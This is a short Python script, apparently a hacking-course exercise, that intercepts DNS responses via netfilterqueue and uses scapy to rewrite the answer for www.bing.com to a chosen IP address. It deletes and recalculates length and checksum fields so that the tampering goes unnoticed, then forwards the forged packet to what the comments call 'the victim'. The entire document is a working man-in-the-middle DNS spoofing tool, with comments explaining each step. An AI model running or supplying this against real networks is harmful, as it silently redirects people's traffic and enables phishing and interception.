#!/usr/bin/env python

import netfilterqueue
import scapy.all as scapy

#we only want to modify the dns whenever the client asks for that specific website
#and not every time the client surfs the internet hence line 13
#on line 18 we spoofed the response and set the result equal to the packet at layer
#DNS an -> DNS answer


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        if "www.bing.com" in str(qname):
            print("[+] Spoofing target")
            answer = scapy.DNSRR(rrname=qname, rdata="8.8.8.8")
            scapy_packet[scapy.DNS].an = answer
            # in the terminal we got 4 answers so we are modifying ancount to only one
            scapy_packet[scapy.DNS].ancount = 1
            #we need to delete the length and checksome to have scapy recalculate
            #the value so when checked they will match; if you don't modify this then
            #it will prove that the packets have been modified because it doesn't match
            #the original length and checksome
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].chksum
            del scapy_packet[scapy.UDP].len

            #first we converted packet to a scapy packet in line 13
            #then we modified lots of the fields from line 15 - 29
            #but all along our original packet still has not been modified
            #so here we modify its payload and set it to the scapy packet
            packet.set_payload(bytes(scapy_packet))

            #here we accept and forward the packet to the victim
    packet.accept()


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet) #connects to the queue and a callback function
queue.run()
